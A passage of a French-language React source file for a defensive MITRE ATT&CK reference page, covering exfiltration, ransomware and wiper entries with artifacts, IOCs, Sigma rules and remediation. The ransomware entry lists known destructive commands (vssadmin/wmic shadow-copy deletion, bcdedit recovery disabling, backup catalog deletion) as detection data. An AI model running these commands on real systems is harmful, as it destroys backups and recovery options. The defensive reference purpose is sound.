      { type: 'DNS Logs', items: ['Sous-domaines encodés : <data_hex>.attacker.com', 'Volume élevé requêtes DNS TXT vers domaine attaquant', 'NXDOMAIN en masse (sous-domaines inexistants)'] },
      { type: 'PCAP', items: ['ICMP Echo avec payload > 64 bytes (normal Windows = 32 bytes)', 'Données dans champs ICMP séquence/timestamp non-standard'] },
    ],
    sigma: ['dns_exfiltration_base64', 'net_icmp_large_payload'],
    iocs: ['Sous-domaines DNS avec données Base32/64 (entropie élevée)', 'Plus de 100 requêtes DNS vers un domaine en 1 minute', 'ICMP payload > 100 bytes hors tests réseau'],
    remediation: ["DNS logging et analyse d'entropie (Zeek, Suricata)", 'Bloquer ICMP vers Internet depuis endpoints', 'Seul DNS interne autorisé (firewall block port 53 UDP vers Internet)'],
  },

  // ─── IMPACT ─────────────────────────────────────────────────────────────────
  {
    id: 'ransomware',
    tactic: 'Impact',
    title: 'Ransomware — Chiffrement & Double Extorsion',
    icon: '💀',
    severity: 'critical',
    ttps: ['T1486', 'T1490', 'T1489'],
    apt: ['LockBit 3.0', 'BlackCat/ALPHV', 'Cl0p', 'Conti', 'Play'],
    malware: ['LockBit', 'BlackCat', 'Hive', 'Conti', 'REvil/Sodinokibi'],
    summary: "Chiffrement de tous les fichiers accessibles avec destruction des Shadow Copies. Précédé d'une exfiltration pour double extorsion (payer ou les données sont publiées).",
    artifacts: [
      { type: 'MFT / $USNJrnl', items: ['Remplacement massif extensions (.lockbit, .encrypted, .alphv)', 'Création README.txt / DECRYPT.txt dans chaque répertoire', 'Suppression Shadow Copies : vssadmin delete shadows /all'] },
      { type: 'EVTX Security', items: ['4688 — vssadmin.exe, wmic.exe avec "shadowcopy delete"', '4688 — bcdedit.exe /set recoveryenabled No', '4698 — tâches de distribution du chiffreur'] },
      { type: 'Préfetch', items: ['Ransomware executable (nom aléatoire ou usurpé)', 'vssadmin.exe, wbadmin.exe, bcdedit.exe'] },
      { type: 'Réseau (avant impact)', items: ['rclone.exe exfiltrant vers MEGA (double extorsion)', 'C2 Cobalt Strike actif plusieurs jours avant chiffrement'] },
    ],
    commands: [
      'vssadmin.exe delete shadows /all /quiet',
      'wmic.exe shadowcopy delete',
      'bcdedit.exe /set {default} recoveryenabled No',
      'net stop "Windows Backup" & net stop VSS',
      'wbadmin delete catalog -quiet',
    ],
    sigma: ['win_ransomware_shadow_delete', 'win_bcdedit_recovery', 'win_ransomware_file_creation'],
    iocs: ['vssadmin / wmic shadowcopy delete (signature ransomware forte)', 'Création de centaines de README.txt en quelques minutes', 'I/O disque exceptionnel (> 10k fichiers/min)', 'rclone.exe avant le chiffrement'],
    remediation: ['3-2-1 Backup avec 1 copie offline et immuable', 'Immutable backups (AWS S3 Object Lock, Azure Immutable Blob)', 'Alerter sur vssadmin delete shadows IMMÉDIATEMENT', 'Micro-segmentation pour limiter propagation SMB', 'EDR avec honeypot files (détection précoce)'],
  },
  {
    id: 'wiper',
    tactic: 'Impact',
    title: 'Wiper — Destruction de Données (Nation-State)',
    icon: '🔥',
    severity: 'critical',
    ttps: ['T1485', 'T1561.001', 'T1561.002'],
    apt: ['Sandworm', 'APT38', 'Lazarus'],
    malware: ['NotPetya', 'WhisperGate', 'HermeticWiper', 'CaddyWiper', 'Shamoon'],
    summary: "Destruction irréversible des données et du MBR/MFT. Objectif : sabotage plutôt que rançon. Stade final des APT nation-state (Russie, Corée du Nord, Iran).",
    artifacts: [
      { type: 'MFT / MBR', items: ['MBR écrasé (secteur 0 du disque)', '$MFT écrasé ou fragmenté', 'Fichiers avec contenu 0x00 ou contenu aléatoire'] },
      { type: 'EVTX Security', items: ['4688 — outil wiper lancé', '4657 — écritures directes sur \\\\.\\PhysicalDrive0'] },
      { type: 'Pilotes', items: ['HermeticWiper : driver EaseUS Partition Master signé pour accès disque raw', 'Driver signé tiers pour contourner Secure Boot'] },
    ],
    sigma: ['win_raw_disk_access', 'win_susp_physical_disk_write', 'win_mbr_wiper_indicators'],
    iocs: ['Accès \\\\.\\PhysicalDrive0 depuis processus non-système', 'Driver signé tiers déployé puis utilisé pour écriture disque raw', 'Tous les fichiers remplis de 0x00', 'Système ne redémarre plus après exécution'],
    remediation: ['UEFI Secure Boot (empêche remplacement MBR)', 'Sauvegardes offline, détachées du réseau', "Détection précoce de l'attaquant AVANT déploiement du wiper", 'Network segmentation pour limiter propagation'],
  },
];

const TACTICS = [
  'Tous', 'Initial Access', 'Execution', 'Persistence', 'Privilege Escalation',
  'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement',
  'Collection', 'Command & Control', 'Exfiltration', 'Impact',
];

const SEV_STYLE = {
  critical: { bg: 'color-mix(in srgb, var(--fl-danger) 8%, transparent)', border: 'color-mix(in srgb, var(--fl-danger) 30%, transparent)', color: 'var(--fl-danger)' },
  high:     { bg: 'color-mix(in srgb, var(--fl-warn) 8%, transparent)',   border: 'color-mix(in srgb, var(--fl-warn) 30%, transparent)',   color: 'var(--fl-warn)' },
  medium:   { bg: 'color-mix(in srgb, var(--fl-gold) 8%, transparent)',   border: 'color-mix(in srgb, var(--fl-gold) 30%, transparent)',   color: 'var(--fl-gold)' },
};

const KILL_CHAIN = ['Initial Access','Execution','Persistence','Priv. Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact'];

function PatternCard({ pattern, search }) {
  const T = useTheme();
  const [open, setOpen] = useState(false);
  const sev = SEV_STYLE[pattern.severity] || SEV_STYLE.high;

  const matches = useMemo(() => {
    if (!search) return true;
    const q = search.toLowerCase();
    return pattern.title.toLowerCase().includes(q) ||
      pattern.summary.toLowerCase().includes(q) ||
      pattern.ttps.some(t => t.toLowerCase().includes(q)) ||
      (pattern.apt || []).some(a => a.toLowerCase().includes(q)) ||
      (pattern.malware || []).some(m => m.toLowerCase().includes(q)) ||
      pattern.artifacts.some(a => a.items.some(i => i.toLowerCase().includes(q))) ||
      (pattern.commands || []).some(c => c.toLowerCase().includes(q)) ||
      (pattern.iocs || []).some(ioc => ioc.toLowerCase().includes(q)) ||
      (pattern.sigma || []).some(s => s.toLowerCase().includes(q)) ||
      (pattern.remediation || []).some(r => r.toLowerCase().includes(q));
  }, [search, pattern]);

  if (!matches) return null;

  return (
    <div style={{ border: `1px solid ${sev.border}`, borderRadius: 8, overflow: 'hidden', marginBottom: 10 }}>
      <button onClick={() => setOpen(o => !o)} className="w-full text-left"
        style={{ padding: '12px 16px', background: sev.bg, border: 'none', cursor: 'pointer', display: 'block', width: '100%' }}>
        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 8 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', flex: 1 }}>
            <span style={{ fontSize: 15 }}>{pattern.icon}</span>
            <span style={{ fontFamily: 'monospace', fontWeight: 700, fontSize: 12, color: T.text }}>{pattern.title}</span>
            <TacticBadge tactic={pattern.tactic} />
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 3 }}>
              {pattern.ttps.map(t => <MitreBadge key={t} id={t} />)}
            </div>
          </div>
          {open ? <ChevronDown size={13} style={{ color: T.dim, flexShrink: 0, marginTop: 2 }} /> : <ChevronRight size={13} style={{ color: T.dim, flexShrink: 0, marginTop: 2 }} />}
        </div>
        <p style={{ fontSize: 11, marginTop: 5, marginLeft: 22, color: T.muted, fontFamily: 'monospace', lineHeight: 1.5 }}>{pattern.summary}</p>
      </button>

      {open && (
        <div style={{ background: T.bg, padding: '14px 16px' }}>

          {/* APT & Malware */}
          <div style={{ display: 'flex', gap: 14, marginBottom: 12, flexWrap: 'wrap' }}>
            {pattern.apt && pattern.apt.length > 0 && (
              <div style={{ flex: 1, minWidth: 190 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginBottom: 5 }}>
                  <Users size={10} style={{ color: 'var(--fl-danger)' }} />
                  <span style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, color: 'var(--fl-danger)', letterSpacing: '0.08em', textTransform: 'uppercase' }}>Groupes APT</span>
                </div>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                  {pattern.apt.map((a, i) => (
                    <span key={i} style={{ fontFamily: 'monospace', fontSize: 10, padding: '2px 6px', borderRadius: 3,
                      background: 'color-mix(in srgb, var(--fl-danger) 10%, transparent)',
                      color: 'var(--fl-danger)', border: '1px solid color-mix(in srgb, var(--fl-danger) 25%, transparent)' }}>{a}</span>
                  ))}
                </div>
              </div>
            )}
            {pattern.malware && pattern.malware.length > 0 && (
              <div style={{ flex: 1, minWidth: 190 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginBottom: 5 }}>
                  <Bug size={10} style={{ color: 'var(--fl-warn)' }} />
                  <span style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, color: 'var(--fl-warn)', letterSpacing: '0.08em', textTransform: 'uppercase' }}>Malware / Outils</span>
                </div>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                  {pattern.malware.map((m, i) => (
                    <span key={i} style={{ fontFamily: 'monospace', fontSize: 10, padding: '2px 6px', borderRadius: 3,
                      background: 'color-mix(in srgb, var(--fl-warn) 10%, transparent)',
                      color: 'var(--fl-warn)', border: '1px solid color-mix(in srgb, var(--fl-warn) 25%, transparent)' }}>{m}</span>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Artifacts */}
          <div style={{ marginBottom: 12 }}>
            <div style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--fl-accent)', marginBottom: 7 }}>Artefacts à rechercher</div>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(250px, 1fr))', gap: 6 }}>
              {pattern.artifacts.map(a => (
                <div key={a.type} style={{ background: T.panel, border: `1px solid ${T.border}`, borderRadius: 5, padding: '7px 9px' }}>
                  <span style={{ fontFamily: 'monospace', fontSize: 10, fontWeight: 700, color: T.text, display: 'block', marginBottom: 4 }}>{a.type}</span>
                  <ul style={{ margin: 0, padding: 0, listStyle: 'none' }}>
                    {a.items.map((item, i) => (
                      <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 4, fontSize: 10, fontFamily: 'monospace', color: T.muted, lineHeight: 1.5, marginBottom: 2 }}>
                        <span style={{ color: sev.color, flexShrink: 0 }}>›</span>
                        <span>{item}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              ))}
            </div>
          </div>

          {/* Commands */}
          {pattern.commands && pattern.commands.length > 0 && (
            <div style={{ marginBottom: 12 }}>
              <div style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--fl-accent)', marginBottom: 7 }}>Commandes malveillantes connues</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
                {pattern.commands.map((cmd, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, padding: '5px 9px', borderRadius: 4,
                    background: T.panel, border: `1px solid ${T.border}` }}>
                    <code style={{ fontFamily: 'monospace', fontSize: 11, color: cmd.startsWith('#') ? T.dim : 'var(--fl-warn)', wordBreak: 'break-all', flex: 1, lineHeight: 1.5 }}>{cmd}</code>
                    {!cmd.startsWith('#') && <CopyBtn text={cmd} />}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Sigma */}
          {pattern.sigma && pattern.sigma.length > 0 && (
            <div style={{ marginBottom: 12 }}>
              <div style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--fl-accent)', marginBottom: 7 }}>Règles Sigma</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5 }}>
                {pattern.sigma.map((s, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 3 }}>
                    <span style={{ fontFamily: 'monospace', fontSize: 10, padding: '2px 7px', borderRadius: 3,
                      background: 'color-mix(in srgb, var(--fl-ok) 10%, transparent)',
                      color: 'var(--fl-ok)', border: '1px solid color-mix(in srgb, var(--fl-ok) 25%, transparent)' }}>{s}</span>
                    <CopyBtn text={s} />
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* IOCs */}
          {pattern.iocs && pattern.iocs.length > 0 && (
            <div style={{ marginBottom: 12 }}>
              <div style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--fl-accent)', marginBottom: 7 }}>Indicateurs de Compromission (IOCs)</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
                {pattern.iocs.map((ioc, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 5, fontSize: 11, fontFamily: 'monospace', padding: '5px 8px', borderRadius: 4,
                    background: 'color-mix(in srgb, var(--fl-danger) 5%, transparent)',
                    border: '1px solid color-mix(in srgb, var(--fl-danger) 18%, transparent)', color: T.text }}>
                    <AlertTriangle size={10} style={{ color: 'var(--fl-danger)', flexShrink: 0, marginTop: 2 }} />
                    <span>{ioc}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Remediation */}
          {pattern.remediation && pattern.remediation.length > 0 && (
            <div>
              <div style={{ fontFamily: 'monospace', fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--fl-accent)', marginBottom: 7 }}>Remédiation & Détection</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
                {pattern.remediation.map((r, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 5, fontSize: 11, fontFamily: 'monospace', padding: '5px 8px', borderRadius: 4,
                    background: 'color-mix(in srgb, var(--fl-ok) 5%, transparent)',
                    border: '1px solid color-mix(in srgb, var(--fl-ok) 15%, transparent)', color: T.text }}>
                    <Shield size={10} style={{ color: 'var(--fl-ok)', flexShrink: 0, marginTop: 2 }} />
                    <span>{r}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default function AttackPatternsDoc({ search }) {
  const T = useTheme();
  const [tacticFilter, setTacticFilter] = useState('Tous');

  const filtered = useMemo(() => {
    return PATTERNS.filter(p => {
      if (tacticFilter !== 'Tous' && p.tactic !== tacticFilter) return false;
      if (!search) return true;
      const q = search.toLowerCase();
      return p.title.toLowerCase().includes(q) ||
        p.summary.toLowerCase().includes(q) ||
        p.ttps.some(t => t.toLowerCase().includes(q)) ||
        (p.apt || []).some(a => a.toLowerCase().includes(q)) ||
        (p.malware || []).some(m => m.toLowerCase().includes(q)) ||
        p.artifacts.some(a => a.items.some(i => i.toLowerCase().includes(q))) ||
        (p.commands || []).some(c => c.toLowerCase().includes(q)) ||
        (p.iocs || []).some(ioc => ioc.toLowerCase().includes(q)) ||
        (p.sigma || []).some(s => s.toLowerCase().includes(q)) ||
        (p.remediation || []).some(r => r.toLowerCase().includes(q));
    });
  }, [search, tacticFilter]);

  return (
    <div style={{ padding: '24px 28px', maxWidth: 960 }}>
      <div style={{ marginBottom: 14 }}>
        <h1 style={{ fontFamily: 'monospace', fontSize: 16, fontWeight: 700, color: T.text, marginBottom: 3 }}>Patterns d'Attaques MITRE ATT&CK</h1>
        <p style={{ fontFamily: 'monospace', fontSize: 11, color: T.muted }}>
          {search || tacticFilter !== 'Tous'
            ? `${filtered.length} pattern${filtered.length !== 1 ? 's' : ''} trouvé${filtered.length !== 1 ? 's' : ''}`
            : `${PATTERNS.length} patterns — APT groups · malware · artefacts · Sigma rules · IOCs · remédiation`}
        </p>
      </div>

      {/* Kill chain */}
      {!search && tacticFilter === 'Tous' && (
        <div style={{ marginBottom: 14, overflowX: 'auto' }}>
          <div style={{ display: 'flex', alignItems: 'center', minWidth: 'max-content' }}>
            {KILL_CHAIN.map((phase, i) => (
              <div key={phase} style={{ display: 'flex', alignItems: 'center' }}>
                <div style={{
                  padding: '3px 8px', fontSize: 8, fontFamily: 'monospace', fontWeight: 700,
                  background: `color-mix(in srgb, var(--fl-accent) ${Math.max(8, 18 - i)}%, transparent)`,
                  color: 'var(--fl-accent)',
                  border: '1px solid color-mix(in srgb, var(--fl-accent) 30%, transparent)',
                  borderRadius: i === 0 ? '4px 0 0 4px' : i === KILL_CHAIN.length - 1 ? '0 4px 4px 0' : 0,
                  borderLeft: i > 0 ? 'none' : undefined,
                  whiteSpace: 'nowrap',
                }}>{phase}</div>
                {i < KILL_CHAIN.length - 1 && (
                  <div style={{ width: 0, height: 0, flexShrink: 0,
                    borderTop: '10px solid transparent', borderBottom: '10px solid transparent',
                    borderLeft: '5px solid color-mix(in srgb, var(--fl-accent) 30%, transparent)',
                  }} />
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tactic filters */}
      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginBottom: 16 }}>
        {TACTICS.map(t => {
          const active = tacticFilter === t;
          const count = t === 'Tous' ? PATTERNS.length : PATTERNS.filter(p => p.tactic === t).length;
          return (
            <button key={t} onClick={() => setTacticFilter(t)}
              style={{
                fontFamily: 'monospace', fontSize: 10, padding: '3px 8px', borderRadius: 4,
                cursor: 'pointer', border: '1px solid',
                background: active ? 'color-mix(in srgb, var(--fl-accent) 18%, transparent)' : 'var(--fl-card)',
                color: active ? 'var(--fl-accent)' : T.dim,
                borderColor: active ? 'color-mix(in srgb, var(--fl-accent) 45%, transparent)' : T.border,
              }}>
              {t} ({count})
            </button>
          );
        })}
      </div>

      {filtered.map(p => <PatternCard key={p.id} pattern={p} search={search} />)}

      {filtered.length === 0 && (
        <div style={{ textAlign: 'center', padding: '60px 0', color: T.muted }}>
          <p style={{ fontFamily: 'monospace', fontSize: 13 }}>Aucun pattern ne correspond à "{search}"</p>
        </div>
      )}
    </div>
  );
}
